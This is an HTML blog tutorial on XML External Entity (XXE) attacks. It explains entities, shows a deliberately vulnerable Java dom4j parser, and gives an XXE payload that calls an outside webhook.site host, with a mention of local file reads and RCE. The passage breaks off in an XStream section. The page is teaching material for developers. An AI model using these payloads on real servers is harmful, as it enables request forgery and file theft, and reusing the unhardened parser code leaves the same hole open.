@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta charset="UTF-8">
+<meta http-equiv="Cache-control" content="public">
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://thesecurityvault.github.io/website/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://thesecurityvault.github.io/website/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://thesecurityvault.github.io/website/favicon/favicon-16x16.png">
+<link rel="manifest" href="https://thesecurityvault.github.io/website/site.webmanifest">
+
+<title>XML External Entities (XXE)</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="" />
+<meta name="keywords" content="">
+<meta name="author" content="Luis Fontes">
+
+
+
+<meta property="og:title" content="XML External Entities (XXE)" />
+<meta property="og:description"
+  content="XML and JSON are two formats ruling the web right now.
+Although JSON&rsquo;s adoption is increasing significantly specially with REST, XML is still widely used.
+What most of developers don&rsquo;t know is that most of the XML parsers out there by following the specification by default have major security flaws. In some cases (not that much) you can even get RCE (Remote Code Execution)
+Lets start by the basics and understand the problem." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thesecurityvault.github.io/website/xml-external-entities-xxe/" /><meta property="og:image" content="https://thesecurityvault.github.io/website/xml-external-entities-xxe/images/banner.png" /><meta property="article:section" content="posts" />
+
+<meta property="article:published_time" content="2019-06-17T00:00:00+00:00" />
+
+<meta property="article:modified_time" content="2022-02-19T11:15:35+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://thesecurityvault.github.io/website/xml-external-entities-xxe/images/banner.png" /><meta name="twitter:title" content="XML External Entities (XXE)" />
+<meta name="twitter:description"
+  content="XML and JSON are two formats ruling the web right now.
+Although JSON&rsquo;s adoption is increasing significantly specially with REST, XML is still widely used.
+What most of developers don&rsquo;t know is that most of the XML parsers out there by following the specification by default have major security flaws. In some cases (not that much) you can even get RCE (Remote Code Execution)
+Lets start by the basics and understand the problem." />
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans&display=swap" rel="stylesheet">
+
+<link rel="dns-prefetch" href="//kit.fontawesome.com" />
+<link rel="stylesheet" href="https://thesecurityvault.github.io/website/css/bootstrap.min.css" />
+<link rel="stylesheet" href="https://thesecurityvault.github.io/website/css/styles.f44e723f4eae0d9fd305bd6958b414d8a14e7f1042dc0709835577b18cde17667f88b57e27421cfa9438bb2fec6b83fd51e856bb15b0921f1bcf3547be94389c.css">
+
+
+
+<script>
+  console.log("Hmm wait, what?!")
+  console.log("77 90 26 59 64 81 81 84 12 89 12 82 80 43 83");
+  console.log("14 6  8  10 1  3  12 2  4  11 9  2  7  5  13");
+  console.log("Should add 20")
+</script></head>
+
+<body><section id="header" class="header-alt"></section>
+<section class="container-fluid menu-container">
+  <div>
+    <nav id="navbar" class="navbar navbar-expand-lg navbar-default sticky" style="z-index:10;">
+      <a class="navbarbar-brand" href="/">
+        <img src="https://thesecurityvault.github.io/website/img/logo.png">
+      </a>
+      <div style="height:50px;"></div>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#menubar" aria-controls="menubar"
+        aria-expanded="false" aria-label="">
+        <span class="navbar-toggler-icon">
+          <i class="fa fa-bars"></i>
+        </span>
+      </button>
+
+
+      <div class="collapse navbar-collapse" id="menubar">
+        <div class="navbar-nav mr-auto"></div>
+
+        <ul class="navbar-nav">
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/website/">
+              Home
+            </a>
+          </li>
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/website/about/">
+              About me
+            </a>
+          </li>
+          
+        </ul>
+
+      </div>
+
+    </nav>
+  </div>
+</section>
+
+
+<div class="container">
+  <div class="page">
+    <section class="single-post">
+
+      <img class="single-post-image" src="https://thesecurityvault.github.io/website/xml-external-entities-xxe/images/banner.png" />
+      <div class="">
+        <div class="single-post-header text-center">
+          <h1>XML External Entities (XXE)</h1>
+          <div class="single-post-details text-secondary">
+            <ul>
+              <li><a href="">luisfontes19</a></li>
+              <li>Jun 17, 2019</li>
+              <li class="text-secondary">6 minutes</li>
+              
+              <li>appsec</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="single-post-content">
+          <p>XML and JSON are two formats ruling the web right now.<br>
+Although JSON&rsquo;s adoption is increasing significantly specially with REST, XML is still widely used.</p>
+<p>What most of developers don&rsquo;t know is that most of the XML parsers out there by following the specification by default have major security flaws. In some cases (not that much) you can even get RCE (Remote Code Execution)</p>
+<p>Lets start by the basics and understand the problem.</p>
+<h3 id="xml-entities">Xml Entities</h3>
+<p>XML by default has what is called an Entity. You can see this as a shortcut, or like a variable. If you need for example, to put the same value in multiple elements you can create an entity, and refer to entity in the elements, like so:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="18"><a style="outline: none; text-decoration:none; color:inherit" href="#18">18</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="19"><a style="outline: none; text-decoration:none; color:inherit" href="#19">19</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="20"><a style="outline: none; text-decoration:none; color:inherit" href="#20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#8f5902;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#8f5902;font-style:italic">&lt;!DOCTYPE post [&lt;!ELEMENT post ANY &gt;</span>
+  <span style="color:#8f5902;font-style:italic">&lt;!ENTITY authorname &#34;Luis Fontes&#34;&gt;</span>
+]&gt;
+<span style="color:#204a87;font-weight:bold">&lt;posts&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+<span style="color:#204a87;font-weight:bold">&lt;/posts&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>In the example above we are telling that the post element will have an entity called authorname. Then we can use that entity in the post as &lsquo;&amp;authorname;&rsquo;</p>
+<p>This is called an internal entity.</p>
+<h3 id="external-entities">External Entities</h3>
+<p>And since we have internal entities we also have external entities.<br>
+External entities get their value from an external source, like so:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="18"><a style="outline: none; text-decoration:none; color:inherit" href="#18">18</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="19"><a style="outline: none; text-decoration:none; color:inherit" href="#19">19</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="20"><a style="outline: none; text-decoration:none; color:inherit" href="#20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#8f5902;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#8f5902;font-style:italic">&lt;!DOCTYPE post [&lt;!ELEMENT post ANY &gt;</span>
+  <span style="color:#8f5902;font-style:italic">&lt;!ENTITY authorname SYSTEM &#34;http://example.com/entities.dtd&#34;&gt;</span>
+]&gt;
+<span style="color:#204a87;font-weight:bold">&lt;posts&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+
+  <span style="color:#204a87;font-weight:bold">&lt;post&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;author&gt;</span><span style="color:#ce5c00">&amp;authorname;</span><span style="color:#204a87;font-weight:bold">&lt;/author&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;content&gt;</span>...<span style="color:#204a87;font-weight:bold">&lt;/content&gt;</span>
+  <span style="color:#204a87;font-weight:bold">&lt;/post&gt;</span>
+<span style="color:#204a87;font-weight:bold">&lt;/posts&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we told that the value of the entity authorname comes from <a href="http://example.com/entities.dtd">http://example.com/entities.dtd</a></p>
+<p>And this is the XXE vulnerability.</p>
+<p>Since this is from the XML specification, most parsers comply with it, and do the request to the url, to get the values for the entities.<br>
+So with XML XXE, you can do Server Side Request Forgery (SSRF) where you manipulate server requests, Port Scanning, File Disclosure, and sometimes Remote Code Execution (RCE).</p>
+<h4 id="attacking-external-entities">Attacking External Entities</h4>
+<p>Lets get our hands dirty and test some scenarios. I&rsquo;ll explain the vulnerability with Java code, and at the end i&rsquo;ll also do a quick overview in C#</p>
+<p>First we need a server to connect to.<br>
+Usually I use netcat to listen on a port and see the requests, but in the last weeks I found an awesome website that receives requests for you, and shows all the content of it. Its the <a href="https://webhook.site/">https://webhook.site/</a>. I&rsquo;ll be using this to receive my requests.</p>
+<p>Next we need a vulnerable application. Let&rsquo;s start with this small code:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5"> 5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6"> 6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7"> 7</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="8"><a style="outline: none; text-decoration:none; color:inherit" href="#8"> 8</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="9"><a style="outline: none; text-decoration:none; color:inherit" href="#9"> 9</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="10"><a style="outline: none; text-decoration:none; color:inherit" href="#10">10</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="11"><a style="outline: none; text-decoration:none; color:inherit" href="#11">11</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="12"><a style="outline: none; text-decoration:none; color:inherit" href="#12">12</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="13"><a style="outline: none; text-decoration:none; color:inherit" href="#13">13</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="14"><a style="outline: none; text-decoration:none; color:inherit" href="#14">14</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="15"><a style="outline: none; text-decoration:none; color:inherit" href="#15">15</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="16"><a style="outline: none; text-decoration:none; color:inherit" href="#16">16</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="17"><a style="outline: none; text-decoration:none; color:inherit" href="#17">17</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="18"><a style="outline: none; text-decoration:none; color:inherit" href="#18">18</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="19"><a style="outline: none; text-decoration:none; color:inherit" href="#19">19</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="20"><a style="outline: none; text-decoration:none; color:inherit" href="#20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#204a87;font-weight:bold">package</span> <span style="color:#000">com.securitywhitepapers.xxe</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">java.io.File</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">java.io.IOException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.Document</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.DocumentException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.dom4j.io.SAXReader</span><span style="color:#ce5c00;font-weight:bold">;</span>
+<span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000">org.jdom2.JDOMException</span><span style="color:#ce5c00;font-weight:bold">;</span>
+
+<span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">class</span> <span style="color:#000">SaxReader</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+
+    <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#204a87;font-weight:bold">static</span> <span style="color:#204a87;font-weight:bold">void</span> <span style="color:#000">main</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">String</span><span style="color:#ce5c00;font-weight:bold">[]</span> <span style="color:#000">args</span><span style="color:#ce5c00;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">throws</span> <span style="color:#000">IOException</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#000">JDOMException</span><span style="color:#ce5c00;font-weight:bold">,</span> <span style="color:#000">DocumentException</span> <span style="color:#ce5c00;font-weight:bold">{</span>
+      
+        <span style="color:#000">SAXReader</span> <span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">SAXReader</span><span style="color:#ce5c00;font-weight:bold">();</span>
+        <span style="color:#000">Document</span> <span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#204a87;font-weight:bold">null</span><span style="color:#ce5c00;font-weight:bold">;</span>
+        <span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">=</span><span style="color:#000">reader</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">read</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">File</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#4e9a06">&#34;payload.xml&#34;</span><span style="color:#ce5c00;font-weight:bold">));</span>
+        <span style="color:#000">System</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">out</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">println</span><span style="color:#ce5c00;font-weight:bold">(</span><span style="color:#000">doc</span><span style="color:#ce5c00;font-weight:bold">.</span><span style="color:#c4a000">asXML</span><span style="color:#ce5c00;font-weight:bold">());</span>
+        
+    <span style="color:#ce5c00;font-weight:bold">}</span>
+<span style="color:#ce5c00;font-weight:bold">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This is the simplest piece of code.<br>
+And as you can see we are reading the content of the file called payload.xml, we need that file as well. Use the following xml, save it with the same name, on the projects root folder</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1">1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2">2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3">3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4">4</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5">5</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="6"><a style="outline: none; text-decoration:none; color:inherit" href="#6">6</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="7"><a style="outline: none; text-decoration:none; color:inherit" href="#7">7</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#8f5902;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+<span style="color:#8f5902;font-style:italic">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span>
+<span style="color:#8f5902;font-style:italic">&lt;!ENTITY bar SYSTEM &#34;https://webhook.site/f0f0f9b4-0845-48f9-9939-aa43558a1529&#34; &gt;</span>]&gt;
+<span style="color:#204a87;font-weight:bold">&lt;contact&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;name&gt;</span>Luis Fontes<span style="color:#204a87;font-weight:bold">&lt;/name&gt;</span>
+    <span style="color:#204a87;font-weight:bold">&lt;foo&gt;</span><span style="color:#ce5c00">&amp;bar;</span><span style="color:#204a87;font-weight:bold">&lt;/foo&gt;</span>
+<span style="color:#204a87;font-weight:bold">&lt;/contact&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now if you run this code, you will notice that a request was made:</p>
+<p><a href="images/image-1-1024x387.png"><img src="images/image-1-1024x387.png" alt="XXE poc"></a></p>
+<p>And voilà. We have XXE.<br>
+If you have a webserver that accepts XML files from user, an attacker may be using your webserver to make requests to other websites, for example.</p>
+<p>But, as I said this is not all, and you can do other type of attacks, like read files from file system.<br>
+To do that you just need to change the schema to file like so:</p>
+<p>´´´xml</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>And if you look at the output:</p>
+<p><a href="images/image-2.png"><img src="images/image-2.png" alt="external entities explotied to read a file"></a></p>
+<p>So we included a local file in the xml.<br>
+This can be leveraged to get other files from the file system, as long as you know the path to the file (and the app opening has permissions to read it).</p>
+<p>To get RCE its harder and you need the server application to use PHP. I won&rsquo;t be getting in to details, just check this <a href="//gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php">link</a> on how it happens.</p>
+<h3 id="xxe-in-xstream">XXE in XStream</h3>
+<p>There is also a known vulnerability in old versions of <a href="https://x-stream.github.io/security.html">XStream</a> that allows you to do RCE, but this is specific to this library and its not XXE, although its with XML as well . Lets see very quickly how it works.</p>
+<p>I used XStream version 1.4.6 to test this, with the following code:</p>
+<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1"> 1</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2"> 2</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3"> 3</a>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4"> 4</a>
